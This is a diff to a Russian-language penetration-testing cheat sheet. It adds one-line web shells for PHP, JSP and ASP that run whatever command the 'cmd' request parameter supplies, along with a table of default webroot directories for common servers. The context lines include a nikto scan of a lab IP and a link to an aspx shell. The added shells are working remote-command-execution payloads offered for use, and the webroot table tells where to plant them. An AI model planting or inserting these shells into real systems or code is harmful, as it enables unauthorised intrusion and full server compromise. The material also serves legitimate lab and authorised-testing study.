@@ -158,7 +158,28 @@ nikto -url http://10.10.217.189/
 
 # Web Shell
 
+Код: php
+
+<?php system($_REQUEST["cmd"]); ?>
+
+Код: jsp
+
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+Код: asp
+
+<% eval request("cmd") %>
+
+
 https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
+
+# ВЕБ РООТ по умолчанию
+
+Веб-сервер 	Webroot по умолчанию
+Apache 		/var/www/html/
+Nginx 		/usr/local/nginx/html/
+IIS 		c:\inetpub\wwwroot\
+XAMPP 		C:\xampp\htdocs\ 
 
 # словарик для бурпа - к примеру заголовки
 
